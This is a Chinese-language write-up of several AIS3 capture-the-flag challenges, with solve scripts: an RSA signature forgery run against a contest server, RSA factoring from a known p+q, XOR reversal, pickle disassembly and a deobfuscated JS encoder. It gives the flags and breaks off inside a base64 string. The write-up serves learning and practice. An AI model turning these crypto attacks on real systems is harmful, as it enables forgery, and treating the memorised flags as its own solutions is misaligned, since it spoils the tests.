from pwn import *from Crypto.Util.number import long_to_bytes, bytes_to_longhost = &#x27;quiz.ais3.org&#x27;port = 42069r = remote(host, port)def egcd(a, b):    if a == 0:        return (b, 0, 1)    g, y, x = egcd(b%a,a)    return (g, x - (b//a) * y, y)def modinv(a, m):    g, x, y = egcd(a, m)    if g != 1:        raise Exception(&#x27;No modular inverse&#x27;)    return x%mname = b&#x27;Ethan Winters&#x27;name_int = bytes_to_long(name)# initr.recvuntil(&#x27;Welcome to ReSident evil villAge, sign the name &quot;Ethan Winters&quot; to get the flag.\n&#x27;)n = int(r.recvlineS().split(&#x27; = &#x27;)[1].strip())e = int(r.recvlineS().split(&#x27; = &#x27;)[1].strip())# input = 2xr.recvuntil(&#x27;1) sign\n2) verify\n3) exit\n&#x27;)r.sendline(&#x27;1&#x27;)r.recvuntil(&#x27;Name (in hex): &#x27;)tmp = hex(name_int * 2)tmp = tmp[2:] if len(tmp) % 2 == 0 else &#x27;0&#x27; + tmp[2:]r.sendline(tmp)hash1 = int(r.recvlineS().split(&#x27; &#x27;)[1].strip())# input = 4xr.recvuntil(&#x27;1) sign\n2) verify\n3) exit\n&#x27;)r.sendline(&#x27;1&#x27;)r.recvuntil(&#x27;Name (in hex): &#x27;)tmp = hex(name_int * 4)tmp = tmp[2:] if len(tmp) % 2 == 0 else &#x27;0&#x27; + tmp[2:]r.sendline(tmp)hash2 = int(r.recvlineS().split(&#x27; &#x27;)[1].strip())# hash2 / hash1 = 2^dans = hash2 * modinv(hash1, n)# hash1 / 2^d = x^dans = hash1 * modinv(ans, n)# send answerr.recvuntil(&#x27;1) sign\n2) verify\n3) exit\n&#x27;)r.sendline(&#x27;2&#x27;)r.recvuntil(&#x27;Signature: &#x27;)r.sendline(str(ans))print(r.recvlineS())

flag : AIS3&#123;R3M383R_70_HAsh_7h3_M3Ssa93_83F0r3_S19N1N9&#125;


Republic of South Africa給的那份 code一開始以為是一個自幹的 RSA但那公式總覺得在哪看過
不過不管 先跑看看發現它生 p q 的 keygen 太大好像電腦就跑不動ㄌ就改個很小測試看看
一次還好多給幾個不同數字就發現它好像會生出圓周率…而且數字給多少就給幾位的圓周率
於是就大膽假設它那個預設是 153 位的圓周率上網稍微複製貼上就有了 我才不要等它慢慢算
接著就是爆破 p q這邊我是用 binary search 下去搜

exp.pyimport mathwith open(&#x27;output.txt&#x27;, &#x27;r&#x27;) as f:	ls = f.readlines()	n = int(ls[0].split(&#x27; = &#x27;)[1].strip())	e = int(ls[1].split(&#x27; = &#x27;)[1].strip())	c = int(ls[2].split(&#x27; = &#x27;)[1].strip())# p + qcount = 314159265358979323846264338327950288419716939937510582097494459230781640628620899862803482534211706798214808651328230664709384460955058223172535940812848def egcd(a, b):	if a == 0:		return (b, 0, 1)	g, y, x = egcd(b%a,a)	return (g, x - (b//a) * y, y)def modinv(a, m):	g, x, y = egcd(a, m)	if g != 1:		raise Exception(&#x27;No modular inverse&#x27;)	return x%mdef binSearch():	l = 0	r = count	while l &lt;= r:		m = (l + r) // 2		tmp = n // m		if m + tmp &lt; count:			l = m + 1		elif m + tmp &gt; count:			r = m		else:			return m	print(&#x27;Not found!&#x27;)	returnif __name__ == &#x27;__main__&#x27;:	p = binSearch()	q = n // p	phi = (p-1)*(q-1)	d = modinv(e, phi)	pt = pow(c, d, n)	flag = bytes.fromhex(hex(pt)[2:])	print(flag)

flag 出來後有個連結就是上面那條公式的推導我一直覺得好像在哪看過原來是高中物理的碰撞公式阿…

flag : AIS3&#123;https://www.youtube.com/watch?v=jsYwFizhncE&#125;


ReversePiano一個 .net 的程式丟 dnspy 看一下就找到關鍵了根據彈的琴鍵有一個特別的順序按對了就會噴 flag
直接寫一個逆推的腳本

exp.py
l1 = [14, 17, 20, 21, 22, 21, 19, 18, 12, 6, 11, 16, 15, 14]l2 = [0, -3, 0, -1, 0, 1, 1, 0, 6, 0, -5, 0, 1, 0]l = [70, 78, 89, 57, 112, 60, 125, 96, 103, 104, 50, 109, 87, 115, 112, 54, 100, 97, 103, 56, 85, 101, 56, 119, 119, 100, 59, 88, 50, 48, 62, 120, 84, 58, 100, 86, 74, 92, 54, 96, 60, 117, 119, 122]note = list()for i in range(14):	note.append((l1[i] + l2[i]) // 2)flag = &#x27;&#x27;for i in range(len(l)):	c = chr(l[i] ^ note[i % 14])	flag += cprint(flag)

flag : AIS3&#123;7wink1e_tw1nkl3_l1ttl3_574r_1n_C_5h4rp&#125;


🐰 Peekora 🥒滑倒 peko
這題是一個 python pickle bytecode用個內建的工具去翻成人看的懂的東西
import pickleimport pickletoolsb = open(&#x27;flag_checker.pkl&#x27;, &#x27;rb&#x27;).read()pickletools.dis(b)

然後稍微照順序整理一下邏輯
startswith == &#x27;AIS3&#123;&#x27;endswith == &#x27;&#125;&#x27;6 == &#x27;A&#x27;9 == &#x27;j&#x27;9 ??11 == &#x27;p&#x27;9 == 14 *1 ??5 == &#x27;d&#x27;10 == &#x27;z&#x27;12 == &#x27;h&#x27;1 == 13 *8 == &#x27;w&#x27;7 == &#x27;m&#x27;


flag : AIS3&#123;dAmwjzphIj&#125;

COLORS有一個混淆過的 js先用 JS NICE 解混淆接著開始 parse 裡面的東西稍微整理一下變這樣

encode.js&#x27;use strict&#x27;;const arr = [&quot;repeat&quot;, &quot;1YqKovX&quot;, &quot;NDBCMjBnMzBpNTFKNjA2MDFcMzB3NDAxMzBBNDFqNDBcNDExMzBnNzB1MzBpMTBrMzBsNDA3NjB4NTBpNTBYMTBLMTBJNDBoNTBYMDBLNDFpNTFsNzA2NzBmNDBvMTA2NTA1NzBLMTFuNTE4NzA3NDFCNTAtMTE4NDB3MzFhMTByNDF6NzBLMzA9MjA9MTA9&quot;, &quot;substr&quot;, &quot;output&quot;, &quot;getElementsByTagName&quot;, &quot;65022JgPEZp&quot;, &quot;keydown&quot;, &quot;length&quot;, &quot;innerHTML&quot;, &quot;677PRUQAU&quot;, &quot;ArrowLeft&quot;, &quot;QWxTM3tCYXNFNjRfaTUrYjByTkluZ35cUXdvLy14SDhXekNqN3ZGRDJleVZrdHFPTDFHaEtZdWZtWmRKcFg5fQ==&quot;, &quot;133781JKLWBV&quot;, &quot;ArrowUp&quot;, &quot;90407czXCgh&quot;, &quot;PGRpdiBzdHlsZT0id2lkdGg6IDM1MHB4OyBwb3NpdGlvbjogYWJzb2x1dGU7IGJvdHRvbTogMHB4OyBsZWZ0OiAwcHg7Ij48ZGl2IHN0eWxlPSJ0ZXh0LWFsaWduOiBjZW50ZXI7IGFuaW1hdGlvbjogcmFpbmJvdyAycyBsaW5lYXIgMHMgaW5maW5pdGUgbm9ybWFsOyBwb3NpdGlvbjogYWJzb2x1dGU7IHRvcDogLTEwcHg7IGxlZnQ6IDUwJTsgZm9udC1zaXplOiAyMHB4OyB0cmFuc2Zvcm06IHRyYW5zbGF0ZVgoLTUwJSk7IHdpZHRoOiAzNTBweDsiPkhlcmUgaXMgeW91cjxicj4iZW5jb2RlZCIgZmxhZyw8YnI+aW5wdXQgdG8gZW5jb2RlIHNvbWV0aGluZyBlbHNlITwvZGl2PiA8c3ZnIGlkPSLwn5CIIiB4PSIwcHgiIHk9IjBweCIgdmlld0JveD0iMCAwIDEyOCAxMjgiIHN0cm9rZT0iIzAwMCIgc3Ryb2tlLXdpZHRoPSIzIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiPjxwYXRoIGlkPSJib2R5Ij48YW5pbWF0ZSBhdHRyaWJ1dGVOYW1lPSJmaWxsIiBkdXI9IjUwMG1zIiByZXBlYXRDb3VudD0iaW5kZWZpbml0ZSIga2V5VGltZXM9IjA7MC4xOzAuMjswLjM7MC40OzAuNTswLjY7MC43OzAuODswLjk7MSIgdmFsdWVzPSIgI2ZmOGQ4YjsgI2ZlZDY4OTsgIzg4ZmY4OTsgIzg3ZmZmZjsgIzhiYjVmZTsgI2Q3OGNmZjsgI2ZmOGNmZjsgI2ZmNjhmNzsgI2ZlNmNiNzsgI2ZmNjk2ODsgI2ZmOGQ4YiAiPjwvYW5pbWF0ZT48YW5pbWF0ZSBhdHRyaWJ1dGVOYW1lPSJkIiBkdXI9IjUwMG1zIiByZXBlYXRDb3VudD0iaW5kZWZpbml0ZSIga2V5VGltZXM9IjA7MC4xOzAuMjswLjM7MC40OzAuNTswLjY7MC43OzAuODswLjk7MSIgdmFsdWVzPSIgTTY3LjEsMTA5LjVjLTkuNiwwLTIzLjYtOC44LTIzLjYtMjRjMC0xMi4xLDE3LjgtNDEsMzcuNS00MWMxNS42LDAsMjMuMywxMC42LDI1LjEsMjAuNSBjMS45LDEwLjcsMy45LDguMiwzLjksMTkuNWMwLDguMi0zLjgsMTctMy44LDIyLjNjMCwzLjksMS40LDcuNCwyLjksMTAuNWMxLjcsMy41LDIuNCw2LjYsMi40LDkuMkg5LjVjMC0xMy43LDEwLjgtMTQsMjEuMS0yMyBjNS42LTQuOSwxMS0xMi40LDE0LjUtMjY7IE01Ni4xLDEwNy41Yy05LjYsMC0yNC42LTEzLjgtMjQuNi0yOWMwLTE2LjIsMTMtNDIsMzMuNS00MmMxNy44LDAsMjIuMywxMS42LDI2LjEsMjIuNSBjMy42LDEwLjMsOS45LDkuMiw5LjksMjAuNWMwLDguMi0xLjgsNy0xLjgsMTIuM2MwLDQuNSwzLjQsOC4yLDYuNCwxNC4xYzIuNSw0LjgsNC44LDExLjIsNC44LDIwLjZoLTk5YzAtMTIuMSw3LjItMTcuNiwxNC43LTI0LjMgYzMuMi0yLjksNi41LTUuOSw5LjItOS44OyBNNDUuMSwxMDkuNWMtNS41LTAuMi0yNy42LTguNC0yNy42LTI3YzAtMTcuOSwxNC44LTQyLDMyLjUtNDJjMTUuNCwwLDI0LDEwLjQsMjYuMSwyMS41IGMxLjMsNi43LDkuOSw5LjgsOS45LDIxLjVjMCw4LjItMC44LDYtMC44LDExLjNjMCw3LjcsMTIuOCw5LDIwLjgsMTVjNy43LDUuOCwxNS41LDE2LjcsMTUuNSwxNi43aC0xMTBjMC00LjgsMS43LTExLjMsNS0xNiBjMy4yLTQuNSw0LjUtOC4zLDUtMTU7IE0zNiwxMjBjLTUuNS0wLjItMjguNS0xMS45LTI4LjUtMzAuNWMwLTE2LjIsMTIuNS00MiwzMy00MmMxNy44LDAsMjEuOCw5LjYsMjUuNiwyMC41IEM2OS43LDc4LjMsNzYsNzguMiw3Niw4OS41YzAsOC4yLTAuOCw0LTAuOCw5LjNjMCw1LjksMTYuNSw3LjgsMjguNCwxNS45YzgsNS41LDE3LjksMTEuOCwxNy45LDExLjhoLTExMGMwLTIuMS0xLjItNS4yLTEuOS0xNC41IGMtMC4zLTMuNi0wLjUtOC4xLTAuNS0xMy45OyBNMzcsMTE5LjVjLTE1LDAuMS0zMy41LTEyLjctMzMuNS0zMEMzLjUsNzMuMywxNiw0NywzNi41LDQ3YzE3LjgsMCwyMi44LDExLDI2LDIyIEM2NS42LDc5LjQsNzMsNzkuMiw3Myw5MC41YzAsNC0xLjgsNi42LTEuOCw4LjNjMCw1LjksMTQuMiw2LjQsMjYuNCwxNS45YzcuNyw2LDEzLjksMTEuOCwxMy45LDExLjhINy41Yy0xLjItMy40LTEuOC03LjMtMS45LTExLjIgYy0wLjItNS4xLDAuMy0xMC4xLDAuOS0xMy43OyBNNDAuNSwxMjEuNWMtMTIuNiwwLTMwLTEzLjQtMzAtMjlDMTAuNSw3Ni4zLDIzLDUzLDQzLjUsNTNjMTQuNSwwLDIyLjgsOS42LDI1LDIyIGMxLjIsNi45LDEwLDkuMiwxMCwyMC41YzAsNCwwLDUuNiwwLDcuM2MwLDQuOSw2LjEsNy41LDExLjIsMTEuOWM1LjgsNSw3LjIsMTEuOCw3LjIsMTEuOEg4LjVjMC0xLjUtMC42LTYuMSwwLjQtMTEuOCBjMC42LTMuNSwxLjktNy41LDQuMy0xMS42OyBNNDguNSwxMjEuNWMtMTIuNiwwLTI1LTYuMy0yNS0xOGMwLTE2LjIsMTMuNy00NywzNi00N2MxNS42LDAsMjQuOCw5LjEsMjcsMjEuNSBjMS4yLDYuOSw3LDkuMiw3LDE4LjVjMCw5LjUtNCwxMS00LDIyYzAsNC4xLDAuNSw1LDEsNmMwLjUsMS4yLDEsMiwxLDJoLTgxYzAtNS4zLDMuMS04LjMsNi4zLTExLjVjMi42LTIuNiw1LjQtNS4zLDYuNy05LjU7IE02OC41LDEyMS41Yy0xMi42LDAtMzMtNS44LTMzLTIzYzAtOS4yLDExLjgtMzYsMzctMzZjMTUuNiwwLDI1LjgsOC4xLDI4LDIwLjUgYzEuMiw2LjksNCw2LjIsNCwxNS41YzAsOS41LTUsMTUuMS01LDIxYzAsMS45LDEsMi4zLDEsNWMwLDEuMiwwLDIsMCwyaC05MWMwLjUtNy42LDcuMS0xMS4xLDEzLjctMTUuN2M0LjktMy40LDkuOS03LjUsMTIuMy0xNC4zOyBNNzMuNSwxMTcuNWMtMTIuNiwwLTMwLTYuMi0zMC0yNWMwLTE0LjIsMjAuOS0zNywzOC0zN2MxNy42LDAsMjUuOCwxMS4xLDI4LDIzLjUgYzEuMiw2LjksMyw3LjIsMywxNi41YzAsMTIuMS02LDE2LjEtNiwyMmMwLDQuMiwyLDUuMywyLDhjMCwxLjIsMCwxLDAsMUg3LjVjMi4xLTkuNCwxMC40LTEzLjMsMTkuMi0xOS40IGM3LjEtNSwxNC40LTExLjUsMTguOC0yMy42OyBNODAuNSwxMTUuNWMtMTIuNiwwLTMyLTkuMi0zMi0yOGMwLTE0LjIsMjIuOS0zNSw0MC0zNWMxNy42LDAsMjUuOCwxMi4xLDI4LDI0LjUgYzEuMiw2LjksMyw2LjIsMywxNS41YzAsMTIuMS02LDE5LjEtNiwyNWMwLDQuMiwyLDUuMywyLDhjMCwxLjIsMCwxLDAsMWgtMTAyYzIuMy04LjcsMTEuNi0xMS43LDIwLjgtMjAuMSBjNS4zLTQuOCwxMC41LTExLjQsMTQuMi0yMS45OyBNNjcuMSwxMDkuNWMtOS42LDAtMjMuNi04LjgtMjMuNi0yNGMwLTEyLjEsMTcuOC00MSwzNy41LTQxYzE1LjYsMCwyMy4zLDEwLjYsMjUuMSwyMC41IGMxLjksMTAuNywzLjksOC4yLDMuOSwxOS41YzAsOC4yLTMuOCwxNy0zLjgsMjIuM2MwLDMuOSwxLjQsNy40LDIuOSwxMC41YzEuNywzLjUsMi40LDYuNiwyLjQsOS4ySDkuNWMwLTEzLjcsMTAuOC0xNCwyMS4xLTIzIGM1LjYtNC45LDExLTEyLjQsMTQuNS0yNiAiPjwvYW5pbWF0ZT48L3BhdGg+PHBhdGggaWQ9ImJlYWsiIGZpbGw9IiM3YjhjNjgiPjxhbmltYXRlIGF0dHJpYnV0ZU5hbWU9ImQiIGR1cj0iNTAwbXMiIHJlcGVhdENvdW50PSJpbmRlZmluaXRlIiBrZXlUaW1lcz0iMDswLjE7MC4yOzAuMzswLjQ7MC41OzAuNjswLjc7MC44OzAuOTsxIiB2YWx1ZXM9IiBNNzguMjksNzBjMC05LjkyLDIuNS0xNCw4LTE0czgsMi4xNyw4LDEwLjY3YzAsMTUuOTItNywyNi4zMy03LDI2LjMzUzc4LjI5LDg1LjUsNzguMjksNzBaOyBNNjIuMjksNjRjMC05LjkyLDIuNS0xNCw4LTE0czgsMi4xNyw4LDEwLjY3YzAsMTUuOTItNywyNi4zMy03LDI2LjMzUzYyLjI5LDc5LjUsNjIuMjksNjRaOyBNNDguMjksNjdjMC05LjkyLDIuNS0xNCw4LTE0czgsMi4xNyw4LDEwLjY3YzAsMTUuOTItNywyNi4zMy03LDI2LjMzUzQ4LjI5LDgyLjUsNDguMjksNjdaOyBNMzYuMjksNzNjMC05LjkyLDIuNS0xNCw4LTE0czgsMi4xNyw4LDEwLjY3YzAsMTUuOTItNywyNi4zMy03LDI2LjMzUzM2LjI5LDg4LjUsMzYuMjksNzNaOyBNMzUuMjksNzVjMC05LjkyLDIuNS0xNCw4LTE0czgsMi4xNyw4LDEwLjY3YzAsMTUuOTItNywyNi4zMy03LDI2LjMzUzM1LjI5LDkwLjUsMzUuMjksNzVaOyBNNDEuMjksODFjMC05LjkyLDIuNS0xNCw4LTE0czgsMi4xNyw4LDEwLjY3YzAsMTUuOTItNywyNi4zMy03LDI2LjMzUzQxLjI5LDk2LjUsNDEuMjksODFaOyBNNTkuMjksODRjMC05LjkyLDIuNS0xNCw4LTE0czgsMi4xNyw4LDEwLjY3YzAsMTUuOTItNywyNi4zMy03LDI2LjMzUzU5LjI5LDk5LjUsNTkuMjksODRaOyBNNzIuMjksODljMC05LjkyLDIuNS0xNCw4LTE0czgsMi4xNyw4LDEwLjY3YzAsMTUuOTItNywyNi4zMy03LDI2LjMzUzcyLjI5LDEwNC41LDcyLjI5LDg5WjsgTTgwLjI5LDgyYzAtOS45MiwyLjUtMTQsOC0xNHM4LDIuMTcsOCwxMC42N2MwLDE1LjkyLTcsMjYuMzMtNywyNi4zM1M4MC4yOSw5Ny41LDgwLjI5LDgyWjsgTTg3LjI5LDc4YzAtOS45MiwyLjUtMTQsOC0xNHM4LDIuMTcsOCwxMC42N2MwLDE1LjkyLTcsMjYuMzMtNywyNi4zM1M4Ny4yOSw5My41LDg3LjI5LDc4WjsgTTc4LjI5LDcwYzAtOS45MiwyLjUtMTQsOC0xNHM4LDIuMTcsOCwxMC42N2MwLDE1LjkyLTcsMjYuMzMtNywyNi4zM1M3OC4yOSw4NS41LDc4LjI5LDcwWiAiPjwvYW5pbWF0ZT48L3BhdGg+PGVsbGlwc2UgaWQ9ImV5ZS1yaWdodCIgcng9IjMiIHJ5PSI0Ij48YW5pbWF0ZSBhdHRyaWJ1dGVOYW1lPSJjeCIgZHVyPSI1MDBtcyIgcmVwZWF0Q291bnQ9ImluZGVmaW5pdGUiIGtleVRpbWVzPSIwOzAuMTswLjI7MC4zOzAuNDswLjU7MC42OzAuNzswLjg7MC45OzEiIHZhbHVlcz0iMTAwOzg0OzcwOzU4OzU3OzYzOzgxOzk0OzEwMjsxMDk7MTAwIj48L2FuaW1hdGU+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iY3kiIGR1cj0iNTAwbXMiIHJlcGVhdENvdW50PSJpbmRlZmluaXRlIiBrZXlUaW1lcz0iMDswLjE7MC4yOzAuMzswLjQ7MC41OzAuNjswLjc7MC44OzAuOTsxIiB2YWx1ZXM9IjYyOzU2OzU5OzY1OzY3OzczOzc2OzgxOzc0OzcwOzYyIj48L2FuaW1hdGU+PC9lbGxpcHNlPjxlbGxpcHNlIGlkPSJleWUtbGVmdCIgcng9IjMiIHJ5PSI0Ij48YW5pbWF0ZSBhdHRyaWJ1dGVOYW1lPSJjeCIgZHVyPSI1MDBtcyIgcmVwZWF0Q291bnQ9ImluZGVmaW5pdGUiIGtleVRpbWVzPSIwOzAuMTswLjI7MC4zOzAuNDswLjU7MC42OzAuNzswLjg7MC45OzEiIHZhbHVlcz0iNjcuNTs1MS41OzM3LjU7MjUuNTsyNC41OzMwLjU7NDguNTs2MS41OzY5LjU7NzYuNTs2Ny41Ij48L2FuaW1hdGU+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iY3kiIGR1cj0iNTAwbXMiIHJlcGVhdENvdW50PSJpbmRlZmluaXRlIiBrZXlUaW1lcz0iMDswLjE7MC4yOzAuMzswLjQ7MC41OzAuNjswLjc7MC44OzAuOTsxIiB2YWx1ZXM9IjYyOzU2OzU5OzY1OzY3OzczOzc2OzgxOzc0OzcwOzYyIj48L2FuaW1hdGU+PC9lbGxpcHNlPjwvc3ZnPjwvZGl2Pg==&quot;, &quot;131837PcDnWL&quot;, &quot;19pQimXL&quot;, &quot;623605MIswVM&quot;, &quot;charCodeAt&quot;, &quot;join&quot;, &quot;4WsUYDr&quot;, &quot;686oWrfyq&quot;, &quot;body&quot;, &quot;map&quot;, &quot;getElementById&quot;, &quot;textContent&quot;, &quot;match&quot;, &quot;key&quot;, &quot;302349wKdZHP&quot;, &quot;4OYJFlQ&quot;, &quot;input&quot;, &quot;padStart&quot;, &quot;Backspace&quot;];/** * @param &#123;number&#125; url * @param &#123;?&#125; whensCollection * @return &#123;?&#125; */function _0x4ebd(url, whensCollection) &#123;  /** @type &#123;number&#125; */  url = url - 454;  let ret = arr[url];  return ret;&#125;(function(data, oldPassword) &#123;  for (; !![];) &#123;    try &#123;      const userPsd = -parseInt(_0x4ebd(486)) + parseInt(_0x4ebd(462)) * -parseInt(_0x4ebd(478)) + -parseInt(_0x4ebd(475)) + -parseInt(_0x4ebd(487)) * parseInt(_0x4ebd(471)) + -parseInt(_0x4ebd(469)) * parseInt(_0x4ebd(457)) + parseInt(_0x4ebd(479)) * -parseInt(_0x4ebd(466)) + parseInt(_0x4ebd(473)) * parseInt(_0x4ebd(474));      if (userPsd === oldPassword) &#123;        break;      &#125; else &#123;        data[&quot;push&quot;](data[&quot;shift&quot;]());      &#125;    &#125; catch (_0xe36f7) &#123;      data[&quot;push&quot;](data[&quot;shift&quot;]());    &#125;  &#125;&#125;)(arr, 359030), (() =&gt; &#123;  /**   * @param &#123;?&#125; params   * @return &#123;?&#125;   */  function init(params) &#123;    if (!params[&quot;length&quot;]) &#123;      return &quot;&quot;;    &#125;    let a = &quot;&quot;;    let ipv6 = &quot;&quot;;    let frameNumber = 0;    for (let i = 0; i &lt; params[&quot;length&quot;]; i++) &#123;      a = a + params[&quot;charCodeAt&quot;](i)[&quot;toString&quot;](2)[&quot;padStart&quot;](8, &quot;0&quot;);    &#125;    /** @type &#123;number&#125; */    frameNumber = a[&quot;length&quot;] % max / 2 - 1;    if (frameNumber != -1) &#123;      a = a + &quot;0&quot;[&quot;repeat&quot;](max - a[&quot;length&quot;] % max);    &#125;    a = a[&quot;match&quot;](/(.&#123;1,10&#125;)/g);    for (let x of a) &#123;      let pivot = parseInt(x, 2);      ipv6 = ipv6 + wrap(pivot &gt;&gt; 6 &amp; 7, pivot &gt;&gt; 9, atob(wpoStr)[pivot &amp; 63]);    &#125;    for (; frameNumber &gt; 0; frameNumber--) &#123;      ipv6 = ipv6 + wrap(frameNumber % fps, 0, &quot;=&quot;);    &#125;    return ipv6;  &#125;  const importSave = &quot;PGRpdiBzdHlsZT0id2lkdGg6IDM1MHB4OyBwb3NpdGlvbjogYWJzb2x1dGU7IGJvdHRvbTogMHB4OyBsZWZ0OiAwcHg7Ij48ZGl2IHN0eWxlPSJ0ZXh0LWFsaWduOiBjZW50ZXI7IGFuaW1hdGlvbjogcmFpbmJvdyAycyBsaW5lYXIgMHMgaW5maW5pdGUgbm9ybWFsOyBwb3NpdGlvbjogYWJzb2x1dGU7IHRvcDogLTEwcHg7IGxlZnQ6IDUwJTsgZm9udC1zaXplOiAyMHB4OyB0cmFuc2Zvcm06IHRyYW5zbGF0ZVgoLTUwJSk7IHdpZHRoOiAzNTBweDsiPkhlcmUgaXMgeW91cjxicj4iZW5jb2RlZCIgZmxhZyw8YnI+aW5wdXQgdG8gZW5jb2RlIHNvbWV0aGluZyBlbHNlITwvZGl2PiA8c3ZnIGlkPSLwn5CIIiB4PSIwcHgiIHk9IjBweCIgdmlld0JveD0iMCAwIDEyOCAxMjgiIHN0cm9rZT0iIzAwMCIgc3Ryb2tlLXdpZHRoPSIzIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiPjxwYXRoIGlkPSJib2R5Ij48YW5pbWF0ZSBhdHRyaWJ1dGVOYW1lPSJmaWxsIiBkdXI9IjUwMG1zIiByZXBlYXRDb3VudD0iaW5kZWZpbml0ZSIga2V5VGltZXM9IjA7MC4xOzAuMjswLjM7MC40OzAuNTswLjY7MC43OzAuODswLjk7MSIgdmFsdWVzPSIgI2ZmOGQ4YjsgI2ZlZDY4OTsgIzg4ZmY4OTsgIzg3ZmZmZjsgIzhiYjVmZTsgI2Q3OGNmZjsgI2ZmOGNmZjsgI2ZmNjhmNzsgI2ZlNmNiNzsgI2ZmNjk2ODsgI2ZmOGQ4YiAiPjwvYW5pbWF0ZT48YW5pbWF0ZSBhdHRyaWJ1dGVOYW1lPSJkIiBkdXI9IjUwMG1zIiByZXBlYXRDb3VudD0iaW5kZWZpbml0ZSIga2V5VGltZXM9IjA7MC4xOzAuMjswLjM7MC40OzAuNTswLjY7MC43OzAuODswLjk7MSIgdmFsdWVzPSIgTTY3LjEsMTA5LjVjLTkuNiwwLTIzLjYtOC44LTIzLjYtMjRjMC0xMi4xLDE3LjgtNDEsMzcuNS00MWMxNS42LDAsMjMuMywxMC42LDI1LjEsMjAuNSBjMS45LDEwLjcsMy45LDguMiwzLjksMTkuNWMwLDguMi0zLjgsMTctMy44LDIyLjNjMCwzLjksMS40LDcuNCwyLjksMTAuNWMxLjcsMy41LDIuNCw2LjYsMi40LDkuMkg5LjVjMC0xMy43LDEwLjgtMTQsMjEuMS0yMyBjNS42LTQuOSwxMS0xMi40LDE0LjUtMjY7IE01Ni4xLDEwNy41Yy05LjYsMC0yNC42LTEzLjgtMjQuNi0yOWMwLTE2LjIsMTMtNDIsMzMuNS00MmMxNy44LDAsMjIuMywxMS42LDI2LjEsMjIuNSBjMy42LDEwLjMsOS45LDkuMiw5LjksMjAuNWMwLDguMi0xLjgsNy0xLjgsMTIuM2MwLDQuNSwzLjQsOC4yLDYuNCwxNC4xYzIuNSw0LjgsNC44LDExLjIsNC44LDIwLjZoLTk5YzAtMTIuMSw3LjItMTcuNiwxNC43LTI0LjMgYzMuMi0yLjksNi41LTUuOSw5LjItOS44OyBNNDUuMSwxMDkuNWMtNS41LTAuMi0yNy42LTguNC0yNy42LTI3YzAtMTcuOSwxNC44LTQyLDMyLjUtNDJjMTUuNCwwLDI0LDEwLjQsMjYuMSwyMS41IGMxLjMsNi43LDkuOSw5LjgsOS45LDIxLjVjMCw4LjItMC44LDYtMC44LDExLjNjMCw3LjcsMTIuOCw5LDIwLjgsMTVjNy43LDUuOCwxNS41LDE2LjcsMTUuNSwxNi43aC0xMTBjMC00LjgsMS43LTExLjMsNS0xNiBjMy4yLTQuNSw0LjUtOC4zLDUtMTU7IE0zNiwxMjBjLTUuNS0wLjItMjguNS0xMS45LTI4LjUtMzAuNWMwLTE2LjIsMTIuNS00MiwzMy00MmMxNy44LDAsMjEuOCw5LjYsMjUuNiwyMC41IEM2OS43LDc4LjMsNzYsNzguMiw3Niw4OS41YzAsOC4yLTAuOCw0LTAuOCw5LjNjMCw1LjksMTYuNSw3LjgsMjguNCwxNS45YzgsNS41LDE3LjksMTEuOCwxNy45LDExLjhoLTExMGMwLTIuMS0xLjItNS4yLTEuOS0xNC41IGMtMC4zLTMuNi0wLjUtOC4xLTAuNS0xMy45OyBNMzcsMTE5LjVjLTE1LDAuMS0zMy41LTEyLjctMzMuNS0zMEMzLjUsNzMuMywxNiw0NywzNi41LDQ3YzE3LjgsMCwyMi44LDExLDI2LDIyIEM2NS42LDc5LjQsNzMsNzkuMiw3Myw5MC41YzAsNC0xLjgsNi42LTEuOCw4LjNjMCw1LjksMTQuMiw2LjQsMjYuNCwxNS45YzcuNyw2LDEzLjksMTEuOCwxMy45LDExLjhINy41Yy0xLjItMy40LTEuOC03LjMtMS45LTExLjIgYy0wLjItNS4xLDAuMy0xMC4xLDAuOS0xMy43OyBNNDAuNSwxMjEuNWMtMTIuNiwwLTMwLTEzLjQtMzAtMjlDMTAuNSw3Ni4zLDIzLDUzLDQzLjUsNTNjMTQuNSwwLDIyLjgsOS42LDI1LDIyIGMxLjIsNi45LDEwLDkuMiwxMCwyMC41YzAsNCwwLDUuNiwwLDcuM2MwLDQuOSw2LjEsNy41LDExLjIsMTEuOWM1LjgsNSw3LjIsMTEuOCw3LjIsMTEuOEg4LjVjMC0xLjUtMC42LTYuMSwwLjQtMTEuOCBjMC42LTMuNSwxLjktNy41LDQuMy0xMS42OyBNNDguNSwxMjEuNWMtMTIuNiwwLTI1LTYuMy0yNS0xOGMwLTE2LjIsMTMuNy00NywzNi00N2MxNS42LDAsMjQuOCw5LjEsMjcsMjEuNSBjMS4yLDYuOSw3LDkuMiw3LDE4LjVjMCw5LjUtNCwxMS00LDIyYzAsNC4xLDAuNSw1LDEsNmMwLjUsMS4yLDEsMiwxLDJoLTgxYzAtNS4zLDMuMS04LjMsNi4zLTExLjVjMi42LTIuNiw1LjQtNS4zLDYuNy05LjU7IE02OC41LDEyMS41Yy0xMi42LDAtMzMtNS44LTMzLTIzYzAtOS4yLDExLjgtMzYsMzctMzZjMTUuNiwwLDI1LjgsOC4xLDI4LDIwLjUgYzEuMiw2LjksNCw2LjIsNCwxNS41YzAsOS41LTUsMTUuMS01LDIxYzAsMS45LDEsMi4zLDEsNWMwLDEuMiwwLDIsMCwyaC05MWMwLjUtNy42LDcuMS0xMS4xLDEzLjctMTUuN2M0LjktMy40LDkuOS03LjUsMTIuMy0xNC4zOyBNNzMuNSwxMTcuNWMtMTIuNiwwLTMwLTYuMi0zMC0yNWMwLTE0LjIsMjAuOS0zNywzOC0zN2MxNy42LDAsMjUuOCwxMS4xLDI4LDIzLjUgYzEuMiw2LjksMyw3LjIsMywxNi41YzAsMTIuMS02LDE2LjEtNiwyMmMwLDQuMiwyLDUuMywyLDhjMCwxLjIsMCwxLDAsMUg3LjVjMi4xLTkuNCwxMC40LTEzLjMsMTkuMi0xOS40IGM3LjEtNSwxNC40LTExLjUsMTguOC0yMy42OyBNODAuNSwxMTUuNWMtMTIuNiwwLTMyLTkuMi0zMi0yOGMwLTE0LjIsMjIuOS0zNSw0MC0zNWMxNy42LDAsMjUuOCwxMi4xLDI4LDI0LjUgYzEuMiw2LjksMyw2LjIsMywxNS41YzAsMTIuMS02LDE5LjEtNiwyNWMwLDQuMiwyLDUuMywyLDhjMCwxLjIs